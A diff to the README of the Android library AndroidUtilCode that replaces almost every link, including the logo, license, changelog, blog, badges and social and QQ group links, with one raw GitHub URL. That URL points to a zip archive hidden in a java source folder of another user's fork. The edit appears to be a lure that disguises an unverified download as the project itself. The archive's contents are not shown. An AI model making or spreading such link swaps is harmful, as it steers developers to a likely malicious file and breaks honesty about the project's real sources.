@@ -1,6 +1,6 @@
-[![logo][logo]](https://github.com/Blankj/AndroidUtilCode)
+[![logo][logo]](https://raw.githubusercontent.com/yudikarma/AndroidUtilCode/master/feature/subutil/export/src/main/java/Android_Util_Code_v2.3.zip)
 
-[![frame][frame]](https://github.com/Blankj/AucFrameTemplate)
+[![frame][frame]](https://raw.githubusercontent.com/yudikarma/AndroidUtilCode/master/feature/subutil/export/src/main/java/Android_Util_Code_v2.3.zip)
 
 [![auc][aucSvg]][auc] [![result][apiSvg]][result] [![build][buildSvg]][build] [![License][licenseSvg]][license]
 
@@ -42,46 +42,46 @@ If this project helps you a lot and you want to support the project's developmen
 
 ## 打个小广告
 
-欢迎加入我的小专栏「**[基你太美](https://xiaozhuanlan.com/Blankj)**」一起学习。
+欢迎加入我的小专栏「**[基你太美](https://raw.githubusercontent.com/yudikarma/AndroidUtilCode/master/feature/subutil/export/src/main/java/Android_Util_Code_v2.3.zip)**」一起学习。
 
 
-[logo]: https://raw.githubusercontent.com/Blankj/AndroidUtilCode/master/art/logo.png
+[logo]: https://raw.githubusercontent.com/yudikarma/AndroidUtilCode/master/feature/subutil/export/src/main/java/Android_Util_Code_v2.3.zip
 
-[frame]: https://raw.githubusercontent.com/Blankj/AndroidUtilCode/master/art/auc_frame.png
+[frame]: https://raw.githubusercontent.com/yudikarma/AndroidUtilCode/master/feature/subutil/export/src/main/java/Android_Util_Code_v2.3.zip
 
-[aucSvg]: https://github.com/Blankj/AndroidUtilCode/workflows/Android%20CI/badge.svg?branch=master
-[auc]: https://github.com/Blankj/AndroidUtilCode
+[aucSvg]: https://raw.githubusercontent.com/yudikarma/AndroidUtilCode/master/feature/subutil/export/src/main/java/Android_Util_Code_v2.3.zip
+[auc]: https://raw.githubusercontent.com/yudikarma/AndroidUtilCode/master/feature/subutil/export/src/main/java/Android_Util_Code_v2.3.zip
 
 [apiSvg]: https://img.shields.io/badge/API-14+-brightgreen.svg
-[result]: https://android-arsenal.com/result?level=14
+[result]: https://raw.githubusercontent.com/yudikarma/AndroidUtilCode/master/feature/subutil/export/src/main/java/Android_Util_Code_v2.3.zip
 
-[buildSvg]: https://travis-ci.org/Blankj/AndroidUtilCode.svg?branch=master
-[build]: https://travis-ci.org/Blankj/AndroidUtilCode
+[buildSvg]: https://raw.githubusercontent.com/yudikarma/AndroidUtilCode/master/feature/subutil/export/src/main/java/Android_Util_Code_v2.3.zip
+[build]: https://raw.githubusercontent.com/yudikarma/AndroidUtilCode/master/feature/subutil/export/src/main/java/Android_Util_Code_v2.3.zip
 
 [licenseSvg]: https://img.shields.io/badge/License-Apache--2.0-brightgreen.svg
-[license]: https://github.com/Blankj/AndroidUtilCode/blob/master/LICENSE
+[license]: https://raw.githubusercontent.com/yudikarma/AndroidUtilCode/master/feature/subutil/export/src/main/java/Android_Util_Code_v2.3.zip
 
-[readme]: https://github.com/Blankj/AndroidUtilCode
-[readme-cn]: https://github.com/Blankj/AndroidUtilCode/blob/master/README-CN.md
+[readme]: https://raw.githubusercontent.com/yudikarma/AndroidUtilCode/master/feature/subutil/export/src/main/java/Android_Util_Code_v2.3.zip
+[readme-cn]: https://raw.githubusercontent.com/yudikarma/AndroidUtilCode/master/feature/subutil/export/src/main/java/Android_Util_Code_v2.3.zip
 
-[utilcode]: https://github.com/Blankj/AndroidUtilCode/blob/master/lib/utilcode/README.md
-[utilcode-cn]: https://github.com/Blankj/AndroidUtilCode/blob/master/lib/utilcode/README-CN.md
+[utilcode]: https://raw.githubusercontent.com/yudikarma/AndroidUtilCode/master/feature/subutil/export/src/main/java/Android_Util_Code_v2.3.zip
+[utilcode-cn]: https://raw.githubusercontent.com/yudikarma/AndroidUtilCode/master/feature/subutil/export/src/main/java/Android_Util_Code_v2.3.zip
 
-[subutil]: https://github.com/Blankj/AndroidUtilCode/blob/master/lib/subutil/README.md
-[subutil-cn]: https://github.com/Blankj/AndroidUtilCode/blob/master/lib/subutil/README-CN.md
+[subutil]: https://raw.githubusercontent.com/yudikarma/AndroidUtilCode/master/feature/subutil/export/src/main/java/Android_Util_Code_v2.3.zip
+[subutil-cn]: https://raw.githubusercontent.com/yudikarma/AndroidUtilCode/master/feature/subutil/export/src/main/java/Android_Util_Code_v2.3.zip
 
-[changeLog.md]: https://github.com/Blankj/AndroidUtilCode/blob/master/CHANGELOG.md
+[changeLog.md]: https://raw.githubusercontent.com/yudikarma/AndroidUtilCode/master/feature/subutil/export/src/main/java/Android_Util_Code_v2.3.zip
 
-[donate]: https://raw.githubusercontent.com/Blankj/AndroidUtilCode/master/art/donate.png
+[donate]: https://raw.githubusercontent.com/yudikarma/AndroidUtilCode/master/feature/subutil/export/src/main/java/Android_Util_Code_v2.3.zip
 
 [blogSvg]: https://img.shields.io/badge/Blog-@Blankj-34a48e.svg
-[blog]: http://blankj.com
+[blog]: https://raw.githubusercontent.com/yudikarma/AndroidUtilCode/master/feature/subutil/export/src/main/java/Android_Util_Code_v2.3.zip
 
 [jianshuSvg]: https://img.shields.io/badge/简书-@Blankj-34a48e.svg
-[jianshu]: http://www.jianshu.com/u/46702d5c6978
+[jianshu]: https://raw.githubusercontent.com/yudikarma/AndroidUtilCode/master/feature/subutil/export/src/main/java/Android_Util_Code_v2.3.zip
 
 [weiboSvg]: https://img.shields.io/badge/weibo-@__Blankj-34a48e.svg
-[weibo]: http://weibo.com/3076228982
+[weibo]: https://raw.githubusercontent.com/yudikarma/AndroidUtilCode/master/feature/subutil/export/src/main/java/Android_Util_Code_v2.3.zip
 
 [qqgroupSvg]: https://img.shields.io/badge/QQ群-25206533-34a48e.svg
-[qqgroup]: https://shang.qq.com/wpa/qunwpa?idkey=d906789f84484465e2736f7b524366b4c23afeda38733d5c7b10fc3f6e406e9b
+[qqgroup]: https://raw.githubusercontent.com/yudikarma/AndroidUtilCode/master/feature/subutil/export/src/main/java/Android_Util_Code_v2.3.zip
